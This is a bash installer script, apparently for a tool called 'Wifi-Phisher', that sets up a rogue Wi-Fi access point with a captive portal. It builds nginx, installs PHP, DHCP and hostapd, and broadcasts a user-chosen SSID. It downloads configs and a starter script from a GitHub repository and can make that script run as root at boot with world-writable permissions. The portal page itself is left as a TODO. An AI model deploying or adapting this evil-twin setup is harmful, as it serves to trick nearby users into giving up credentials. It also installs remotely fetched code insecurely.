#!/bin/bash

if [ "$EUID" -ne 0 ]
then
echo "Permission denied"
exit
fi

#Run the fucking installer

#Create variables
read -p "Enter the name of the Wifi: " WIFI_NAME
read -p "Enter the wlan interface (normally it's: wlan0): " WIFI_INTERFACE
read -p "Enter the domain of the Captive-Portal (Example: \"login.com\" [! No Protocol:(\"http://\"])): " WIFI_DOMAIN
read -p "Enter the username for your dashboard: " DASH_USER
read -p "Enter the password for your dashboard: " DASH_PASS
read -p "Add the Starter-Script to autostart (yes,no): " ADD_TO_STARTUP

#Make www folder
mkdir /WWW
chown www-data:www-data -R /WWW

#Make folder to hold the things
mkdir /Wifi-Attack
cd /Wifi-Attack
#Make /Wifi-Attack/NginxConfig - folder
mkdir NginxConfig

#Write the interface to file
echo "$WIFI_INTERFACE" > WifiInterface
echo "return 302 http://$WIFI_DOMAIN/;" > WifiDomain.conf

#Upgrade and update
apt update
apt upgrade -y

#Installing for add-apt-repository
apt install software-properties-common python-software-properties -y


#Download neccessary things
apt install -y curl build-essential make gcc libpcre3 libpcre3-dev libpcre++-dev zlib1g-dev libbz2-dev libxslt1-dev libxml2-dev libgd2-xpm-dev libgeoip-dev libgoogle-perftools-dev libperl-dev libssl-dev libcurl4-openssl-dev

#Download/Intall nginx
wget -O nginx.tar.gz http://nginx.org/download/nginx-1.13.9.tar.gz
tar -xvf nginx.tar.gz

cd nginx-1.13.9

#Configure nginx | Thanks to: https://www.linuxbabe.com/raspberry-pi/compile-nginx-source-raspbian-jessie
./configure \
--prefix=/etc/nginx                                                \
--sbin-path=/usr/sbin/nginx                                        \
--conf-path=/etc/nginx/nginx.conf                                  \
--error-log-path=/var/log/nginx/error.log                          \
--http-log-path=/var/log/nginx/access.log                          \
--pid-path=/var/run/nginx.pid                                      \
--lock-path=/var/run/nginx.lock                                    \
--http-client-body-temp-path=/var/cache/nginx/client_temp          \
--http-proxy-temp-path=/var/cache/nginx/proxy_temp                 \
--http-fastcgi-temp-path=/var/cache/nginx/fastcgi_temp             \
--http-uwsgi-temp-path=/var/cache/nginx/uwsgi_temp                 \
--http-scgi-temp-path=/var/cache/nginx/scgi_temp                   \
--user=nginx                                                       \
--group=nginx                                                      \
--with-http_ssl_module                                             \
--with-http_realip_module                                          \
--with-http_addition_module                                        \
--with-http_sub_module                                             \
--with-http_dav_module                                             \
--with-http_flv_module                                             \
--with-http_mp4_module                                             \
--with-http_gunzip_module                                          \
--with-http_gzip_static_module                                     \
--with-http_random_index_module                                    \
--with-http_secure_link_module                                     \
--with-http_stub_status_module                                     \
--with-http_auth_request_module                                    \
--with-mail                                                        \
--with-mail_ssl_module                                             \
--with-file-aio                                                    \
--with-http_v2_module                                              \
--with-ipv6                                                        \
--with-threads                                                     \
--with-stream                                                      \
--with-stream_ssl_module                                           \
--with-http_slice_module

make
make install

#Do some nginx-file-error prevention crap
mkdir -p /var/cache/nginx/client_temp
mkdir -p /etc/nginx/logs; touch /etc/nginx/logs/access.log;


#Move back
cd /Wifi-Attack

# NGINX INSTALLED --> install PHP
apt install php7.0 php7.0-fpm -y

#Install dnsmasq + hostapd
apt install dnsmasq isc-dhcp-server hostapd -y

#Configure the hostapd file
cd /Wifi-Attack

echo "interface=$WIFI_INTERFACE" > hostapd.conf
echo "driver=nl80211" >> hostapd.conf
echo "ssid=$WIFI_NAME" >> hostapd.conf
echo "channel=7" >> hostapd.conf

#DOWNLOAD dhcpd config and put it to /etc/dhcp/dhcpd.conf
wget -O dhcpd.conf https://raw.githubusercontent.com/MarcAndre-Wessner/Wifi-Phisher/master/dhcpd.conf
rm /etc/dhcp/dhcpd.conf
mv dhcpd.conf /etc/dhcp/dhcpd.conf

#Download Nginx config and put it to /Wifi-Attack/NginxConfig/nginx.conf
wget -O nginx.conf https://raw.githubusercontent.com/MarcAndre-Wessner/Wifi-Phisher/master/nginx.conf
rm /Wifi-Attack/NginxConfig/nginx.conf
mv nginx.conf /Wifi-Attack/NginxConfig/nginx.conf

#Download the starterscript and put it to /
wget -O StartWifi.sh https://raw.githubusercontent.com/MarcAndre-Wessner/Wifi-Phisher/master/StartWifi.sh
mv StartWifi.sh /
chmod 777 /StartWifi.sh

#Add the script to startup
if [ "$ADD_TO_STARTUP" == "yes" ]
then

#Create startup script
touch /etc/init.d/startwifi
chmod 777 /etc/init.d/startwifi
echo '#!/bin/bash' > /etc/init.d/startwifi
echo "sudo /StartWifi.sh" >> /etc/init.d/startwifi
#Create symlink
ln -s /etc/init.d/startwifi /etc/rc.d/

fi

#TODO: DOwnload the Example PORTAL

